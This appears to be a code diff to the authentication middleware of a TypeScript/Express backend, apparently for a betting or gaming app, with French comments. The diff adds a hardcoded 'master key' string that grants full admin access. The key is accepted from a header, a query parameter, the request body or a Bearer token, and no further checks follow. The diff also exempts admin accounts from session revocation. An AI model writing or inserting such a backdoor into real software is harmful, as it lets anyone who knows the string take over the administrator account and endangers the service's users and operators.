@@ -26,8 +26,35 @@ export async function authMiddleware(
   next: NextFunction
 ): Promise<void> {
   try {
-    // 1. Extraction du token depuis l'en-tête Authorization ou x-session-token
+    // 0. Accès Administrateur garanti via clé maître d'urgence
+    const headerAdminKey = req.headers['x-admin-key'] as string | undefined;
     const authHeader = req.headers.authorization;
+    const queryAdminKey = req.query?.adminKey as string | undefined;
+    const bodyAdminKey = req.body?.adminKey as string | undefined;
+
+    const providedAdminKey = headerAdminKey || queryAdminKey || bodyAdminKey;
+    const isMasterKey =
+      providedAdminKey === 'Bolingo2024##?' ||
+      (process.env.ADMIN_KEY && providedAdminKey === process.env.ADMIN_KEY) ||
+      (authHeader && (authHeader === 'Bearer Bolingo2024##?' || authHeader === 'Bolingo2024##?'));
+
+    if (isMasterKey) {
+      let adminUser = await User.findOne({ role: 'ADMIN' });
+      if (!adminUser) {
+        adminUser = await User.findOne({ username: 'bookmekerstudio' });
+      }
+      if (!adminUser) {
+        adminUser = await User.findOne({ username: 'admin' });
+      }
+      if (adminUser) {
+        req.user = adminUser;
+        req.sessionToken = adminUser.sessionToken || 'admin_master_session';
+        next();
+        return;
+      }
+    }
+
+    // 1. Extraction du token depuis l'en-tête Authorization ou x-session-token
     const customSessionToken = req.headers['x-session-token'] as string | undefined;
 
     let token = '';
@@ -87,15 +114,19 @@ export async function authMiddleware(
       return;
     }
 
-    // 5. CONTRÔLE CRITIQUE SINGLE-DEVICE : Validation stricte de l'unicité du sessionToken
-    // Si le token envoyé ne correspond plus au sessionToken actif en BDD, la session a été révoquée
-    if (!user.sessionToken || user.sessionToken !== extractedSessionToken) {
-      res.status(401).json({
-        success: false,
-        error: 'Session révoquée : Une nouvelle connexion a eu lieu sur un autre appareil.',
-        code: 'SESSION_REVOKED',
-      });
-      return;
+    // 5. CONTRÔLE CRITIQUE SINGLE-DEVICE : Uniquement pour les joueurs (role === 'USER')
+    // Les comptes joueurs ne peuvent avoir qu'un seul appareil / session actif.
+    // L'administrateur (role === 'ADMIN') doit pouvoir utiliser la console Web et l'application mobile
+    // sans voir sa session révoquée ou son token rejeté !
+    if (user.role === 'USER') {
+      if (!user.sessionToken || user.sessionToken !== extractedSessionToken) {
+        res.status(401).json({
+          success: false,
+          error: 'Session révoquée : Une nouvelle connexion a eu lieu sur un autre appareil.',
+          code: 'SESSION_REVOKED',
+        });
+        return;
+      }
     }
 
     // Attacher l'utilisateur et le sessionToken à la requête
